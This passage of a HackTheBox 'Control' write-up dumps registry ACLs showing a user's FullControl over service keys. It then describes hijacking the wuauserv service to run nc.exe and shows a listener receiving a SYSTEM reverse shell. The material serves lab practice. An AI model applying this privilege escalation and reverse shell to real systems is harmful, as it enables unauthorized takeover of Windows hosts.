Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WerSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WFPLWFS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WFPLWFS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WiaRpc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WiaRpc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WIMMount</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WIMMount</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinDefend</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinDefend</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Windows Workflow Foundation 4.0.0.0</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Windows Workflow Foundation 4.0.0.0</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WindowsTrustedRT</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WindowsTrustedRT</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WindowsTrustedRTProxy</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WindowsTrustedRTProxy</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinHttpAutoProxySvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinHttpAutoProxySvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinMad</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinMad</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Winmgmt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Winmgmt</span><br><span class="line">                          BUILTIN\Users Allow  -1610612736</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinNat</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinNat</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinQuic</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinQuic</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinRM</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinRM</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Winsock</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Winsock</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinSock2</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinSock2</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WINUSB</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WINUSB</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinVerbs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WinVerbs</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wisvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wisvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WlanSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WlanSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wlidsvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wlidsvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WmiAcpi</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WmiAcpi</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WmiApRpl</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WmiApRpl</span><br><span class="line">                          BUILTIN\Users Allow  -1610612736</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wmiApSrv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wmiApSrv</span><br><span class="line">                          BUILTIN\Users Allow  -1610612736</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WMPNetworkSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WMPNetworkSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Wof</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Wof</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\workerdd</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\workerdd</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WPDBusEnum</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WPDBusEnum</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WpdUpFltr</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WpdUpFltr</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WpnService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WpnService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WpnUserService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : WpnUserService</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WpnUserService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WpnUserService_42246</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : WpnUserService_42246</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WpnUserService_42246</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WpnUserService_4248c</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : WpnUserService_4248c</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WpnUserService_4248c</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WpnUserService_80d08</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : WpnUserService_80d08</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WpnUserService_80d08</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WpnUserService_ee306</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">PSChildName             : WpnUserService_ee306</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WpnUserService_ee306</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ws2ifsl</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ws2ifsl</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WSearch</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WSearch</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WSearchIdxPi</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WSearchIdxPi</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wuauserv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wuauserv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WudfPf</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WudfPf</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WUDFRd</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WUDFRd</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\xmlprov</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\xmlprov</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\&#123;60E8E863-2974-47D1-89E0-E507677AA14F&#125;</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\&#123;60E8E863-2974-47D1-89E0-E507677AA14F&#125;</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\&#123;6D197A8D-04EB-44C6-B602-FF2798EB7BB3&#125;</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\&#123;6D197A8D-04EB-44C6-B602-FF2798EB7BB3&#125;</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\&#123;CB20B026-8E3E-4F7D-88FD-E7FB0E93CF39&#125;</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\&#123;CB20B026-8E3E-4F7D-88FD-E7FB0E93CF39&#125;</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">*Evil-WinRM* PS C:\Users\Hector\Desktop&gt;</span><br></pre></td></tr></table></figure><p>As you can see‚Äô <strong>Hector</strong> have full control of all the services. I will going abuse the service <code>wuauserv</code> to execute a <code>nc.exe</code> with administrators privileges:</p><p>I copy again <code>nc.exe</code> using samba from this directory <code>C:\windows\system32\spool\drivers\color\nc.exe</code> after that add it into <code>registry</code></p><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line"># bash</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:<span class="symbol">\U</span>sers<span class="symbol">\H</span>ector<span class="symbol">\D</span>esktop&gt; Get-ItemProperty HKLM:<span class="symbol">\S</span>ystem<span class="symbol">\C</span>urrentControlSet<span class="symbol">\s</span>ervices<span class="symbol">\w</span>uauserv</span><br><span class="line">Get-ItemProperty HKLM:<span class="symbol">\S</span>ystem<span class="symbol">\C</span>urrentControlSet<span class="symbol">\s</span>ervices<span class="symbol">\w</span>uauserv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DependOnService     : &#123;rpcss&#125;</span><br><span class="line">Description         : @<span class="variable">%systemroot%</span><span class="symbol">\s</span>ystem32<span class="symbol">\w</span>uaueng.dll,-106</span><br><span class="line">DisplayName         : @<span class="variable">%systemroot%</span><span class="symbol">\s</span>ystem32<span class="symbol">\w</span>uaueng.dll,-105</span><br><span class="line">ErrorControl        : 1</span><br><span class="line">FailureActions      : &#123;128, 81, 1, 0...&#125;</span><br><span class="line">ImagePath           : C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\s</span>vchost.exe -k netsvcs -p</span><br><span class="line">ObjectName          : LocalSystem</span><br><span class="line">RequiredPrivileges  : &#123;SeAuditPrivilege, SeCreateGlobalPrivilege, SeCreatePageFilePrivilege, SeTcbPrivilege...&#125;</span><br><span class="line">ServiceSidType      : 1</span><br><span class="line">Start               : 3</span><br><span class="line">SvcMemHardLimitInMB : 246</span><br><span class="line">SvcMemMidLimitInMB  : 167</span><br><span class="line">SvcMemSoftLimitInMB : 88</span><br><span class="line">Type                : 32</span><br><span class="line">PSPath              : Microsoft.PowerShell.Core<span class="symbol">\R</span>egistry::HKEY_LOCAL_MACHINE<span class="symbol">\S</span>ystem<span class="symbol">\C</span>urrentControlSet<span class="symbol">\s</span>ervices<span class="symbol">\w</span>uauserv</span><br><span class="line">PSParentPath        : Microsoft.PowerShell.Core<span class="symbol">\R</span>egistry::HKEY_LOCAL_MACHINE<span class="symbol">\S</span>ystem<span class="symbol">\C</span>urrentControlSet<span class="symbol">\s</span>ervices</span><br><span class="line">PSChildName         : wuauserv</span><br><span class="line">PSDrive             : HKLM</span><br><span class="line">PSProvider          : Microsoft.PowerShell.Core<span class="symbol">\R</span>egistry</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:<span class="symbol">\U</span>sers<span class="symbol">\H</span>ector<span class="symbol">\D</span>esktop&gt;</span><br></pre></td></tr></table></figure><h3 id="Become-Administrator-and-get-root-txt"><a href="#Become-Administrator-and-get-root-txt" class="headerlink" title="Become Administrator and get root.txt"></a>Become Administrator and get root.txt</h3><p>setup again a <code>netcat</code> listener from my Kali Linux and then start the services.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Hector\Desktop&gt; Start-Service wuauserv</span><br><span class="line">Start-Service wuauserv</span><br></pre></td></tr></table></figure><p>Finally got now the administrator shell and <code>root.txt</code></p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"># bash</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Control via üêò v7<span class="number">.3</span><span class="number">.15</span> </span><br><span class="line">‚ùØ nc -nlvp <span class="number">4444</span></span><br><span class="line">listening on [any] <span class="number">4444</span> ...</span><br><span class="line">connect to [<span class="number">10.10</span><span class="number">.15</span><span class="number">.102</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">10.10</span><span class="number">.10</span><span class="number">.167</span>] <span class="number">56682</span></span><br><span class="line">Microsoft Windows [Version <span class="number">10.0</span><span class="number">.17763</span><span class="number">.805</span>]</span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;hostname</span><br><span class="line">hostname</span><br><span class="line">Fidelity</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;cd \Users\Administrator\Desktop</span><br><span class="line">cd \Users\Administrator\Desktop</span><br><span class="line"></span><br><span 